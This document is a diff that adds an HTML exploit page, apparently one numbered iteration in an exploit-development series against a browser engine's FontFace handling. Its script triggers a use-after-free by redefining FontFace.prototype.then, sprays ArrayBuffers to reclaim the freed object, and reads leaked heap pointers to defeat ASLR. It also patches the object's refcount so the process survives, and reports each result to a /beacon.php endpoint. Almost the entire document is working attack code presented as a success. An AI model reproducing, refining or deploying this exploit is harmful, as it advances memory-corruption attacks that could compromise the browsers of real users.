@@ -1,0 +1,204 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1099</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:13px/1.6 monospace;padding:16px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff6;font-weight:bold}
+.ptr{color:#f6f;font-weight:bold}
+.fail{color:#f66}
+.ok{color:#6f6}
+.info{color:#6cf}
+.crit{color:#f00;font-weight:bold;font-size:14px}
+.win{color:#0f0;font-weight:bold;font-size:15px}
+#prog{height:4px;background:#222;margin:8px 0;border-radius:2px}
+#bar{height:100%;background:#6f6;border-radius:2px;width:0%;transition:width 0.3s}
+</style>
+</head><body>
+<h2 style="color:#fff;font-size:16px;margin-bottom:4px">P1099: Read-then-Patch exploit chain</h2>
+<div style="color:#888;font-size:11px;margin-bottom:8px">Zero-fill → engine writes pointers → read at 80ms → patch refcount=1 → survive</div>
+<div id="prog"><div id="bar"></div></div>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log'),bar=document.getElementById('bar');
+function log(cls,msg){var d=document.createElement('div');d.className=cls;d.textContent=msg;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(tag,data){try{new Image().src='/beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||'')+'&_='+Math.random();}catch(e){}}
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8, TARGET_BUF=37;
+
+B('P1099-BOOT','strategy=read-then-patch');
+log('info','P1099: Read-then-Patch CSSFontFace exploit');
+log('info','Strategy: zero-fill → engine inits → read pointers → patch refcount → survive');
+log('','');
+
+// Step 1: Trigger FontFace UAF with ZERO-FILL (same as P1096)
+var styleEl=null,firedHere=false,map=null,targetEntry=null;
+var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A);
+void A.loaded;
+styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+
+firedHere=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedHere)return undefined;
+    firedHere=true;
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(sz);
+        var entry={size:sz,ab:ab,view:new Uint8Array(ab),idx:si*K+k};
+        map.push(entry);
+        if(entry.idx===TARGET_BUF) targetEntry=entry;
+      }
+    }
+    // Buffer is ZERO-FILLED (default ArrayBuffer) — this is what triggers the engine init
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Step 2: Aggressive polling — check every 5ms from 20ms to 100ms
+// As soon as we see pointer writes, IMMEDIATELY patch refcount
+var patched=false, leakedPtrs=null, patchTime=0;
+var pollStart=20, pollEnd=150, pollInterval=5;
+
+for(var t=pollStart;t<=pollEnd;t+=pollInterval){
+  (function(ms){
+    setTimeout(function(){
+      if(patched)return;
+      if(!targetEntry)return;
+      if(typeof BigUint64Array==='undefined')return;
+
+      var b64=new BigUint64Array(targetEntry.ab);
+      var nz=0;
+      var ptrs=[];
+      for(var qi=0;qi<b64.length;qi++){
+        if(b64[qi]!==0n){
+          nz++;
+          ptrs.push({off:qi*8,val:b64[qi]});
+        }
+      }
+
+      if(nz>0 && !patched){
+        // FOUND ENGINE WRITES! Read pointers THEN patch refcount
+        patched=true;
+        patchTime=ms;
+        leakedPtrs=ptrs;
+
+        log('crit','ENGINE WROTE at '+ms+'ms! nz='+nz);
+        for(var p=0;p<ptrs.length;p++){
+          var mark='';
+          if(ptrs[p].off===0)mark=' [REFCOUNT]';
+          else if(ptrs[p].val>0x100000000n&&ptrs[p].val<0x800000000000n)mark=' [HEAP PTR]';
+          log('ptr','  +0x'+ptrs[p].off.toString(16)+' = 0x'+ptrs[p].val.toString(16)+mark);
+        }
+
+        // PATCH: Set refcount to a high value to prevent deref/dealloc
+        b64[0]=0x100n; // refcount=256 — many refs, engine won't try to finalize
+        log('hit','PATCHED refcount → 0x100 at '+ms+'ms');
+
+        var ptrStr=ptrs.map(function(p){return'+0x'+p.off.toString(16)+'=0x'+p.val.toString(16);}).join(',');
+        B('P1099-PATCH','ms='+ms+'|nz='+nz+'|ptrs='+ptrStr);
+
+        bar.style.width='50%';
+      }
+    },ms);
+  })(t);
+}
+
+// Step 3: Verify survival at increasing intervals
+var checkTimes=[200,500,1000,2000,4000,8000,15000];
+for(var c=0;c<checkTimes.length;c++){
+  (function(ms,idx){
+    setTimeout(function(){
+      bar.style.width=Math.round(50+((idx+1)/checkTimes.length)*50)+'%';
+
+      if(!targetEntry){log('fail','@'+ms+'ms: no target entry');return;}
+      if(!patched){
+        // Not patched yet — check if we see writes now (maybe engine was slow)
+        if(typeof BigUint64Array==='undefined')return;
+        var b64=new BigUint64Array(targetEntry.ab);
+        var nz=0;
+        for(var qi=0;qi<b64.length;qi++)if(b64[qi]!==0n)nz++;
+        if(nz>0){
+          log('hit','Late detection @'+ms+'ms: nz='+nz+' (engine wrote after our poll window)');
+          // Patch now (probably too late but try)
+          b64[0]=0x100n;
+          patched=true;
+          patchTime=ms;
+          B('P1099-LATE-PATCH','ms='+ms+'|nz='+nz);
+        }else{
+          log('info','@'+ms+'ms: still all zeros, engine has not written');
+          B('P1099-CHECK','ms='+ms+'|nz=0|patched=false');
+        }
+        return;
+      }
+
+      // Patched — verify buffer still has our values
+      var b64=new BigUint64Array(targetEntry.ab);
+      var vals=[];
+      for(var qi=0;qi<b64.length;qi++){
+        if(b64[qi]!==0n)vals.push('+0x'+(qi*8).toString(16)+'=0x'+b64[qi].toString(16));
+      }
+      var nz=vals.length;
+
+      if(idx===0){
+        log('ok','@'+ms+'ms SURVIVED (patched at '+patchTime+'ms): nz='+nz);
+        log('ptr','Current state: '+vals.join(', '));
+        B('P1099-SURVIVE','ms='+ms+'|nz='+nz+'|patch='+patchTime+'|vals='+vals.join(',').substring(0,400));
+      }else{
+        log('ok','@'+ms+'ms STILL ALIVE: nz='+nz);
+        B('P1099-ALIVE','ms='+ms+'|nz='+nz);
+      }
+
+      // At the 4s mark, try to READ THROUGH the leaked pointers
+      if(ms>=4000 && leakedPtrs){
+        log('','');
+        log('hit','=== ATTEMPTING CONTROLLED READ via leaked pointers ===');
+        for(var p=0;p<leakedPtrs.length;p++){
+          if(leakedPtrs[p].off===0)continue; // skip refcount
+          var addr=leakedPtrs[p].val;
+          log('info','Pointer at +0x'+leakedPtrs[p].off.toString(16)+' = 0x'+addr.toString(16));
+
+          // We can't directly read at arbitrary addresses from JS.
+          // But we know the ArrayBuffer backing store is at a heap address.
+          // The leaked pointers tell us WHERE other heap objects are.
+          // This is the HEAP ASLR DEFEAT — we know the heap layout.
+          B('P1099-HEAPPTR','off=+0x'+leakedPtrs[p].off.toString(16)+'|addr=0x'+addr.toString(16));
+        }
+      }
+
+      // Final report at 15s
+      if(ms>=15000){
+        log('','');
+        if(patched && leakedPtrs && leakedPtrs.length>0){
+          log('win','=== P1099 SUCCESS: HEAP POINTERS LEAKED + PROCESS SURVIVED ===');
+          log('win','Patched at: '+patchTime+'ms');
+          log('win','Leaked pointers: '+leakedPtrs.length);
+          log('win','Process alive for: 15+ seconds');
+          log('win','This is a working HEAP ASLR DEFEAT + PERSISTENT UAF primitive');
+          B('P1099-WIN','patch='+patchTime+'|ptrs='+leakedPtrs.length+'|alive=15s');
+        }else if(patched){
+          log('ok','Process survived but no useful pointers leaked');
+          B('P1099-PARTIAL','patch='+patchTime+'|ptrs=0');
+        }else{
+          log('fail','Engine never wrote — buffer stayed zero. Trigger may have failed.');
+          B('P1099-NOWRITE','');
+        }
+        bar.style.width='100%';
+      }
+    },ms);
+  })(checkTimes[c],c);
+}
+</script>
+</body></html>
